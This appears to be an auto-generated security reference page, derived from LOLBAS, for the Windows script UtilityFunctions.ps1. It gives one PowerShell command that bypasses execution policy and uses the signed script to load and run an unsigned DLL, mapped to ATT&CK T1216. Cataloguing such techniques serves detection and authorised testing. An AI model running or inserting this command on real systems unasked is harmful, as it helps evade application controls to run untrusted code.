---
parsed_by: focuslocust
source: commands
type: generated
---
# UtilityFunctions.ps1 Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## UtilityFunctions.ps1

Tool page: [UtilityFunctions.ps1](../../tools/windows/utilityfunctions.ps1.md)

### Execute proxied payload with Microsoft signed binary

```text
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
```

Description:

Proxy execute Managed DLL with PowerShell

Related ATT&CK:

- [T1216](../../attack/techniques/T1216-system-script-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/UtilityFunctions.yml` |
| Evidence | Command preserved from source parser. |
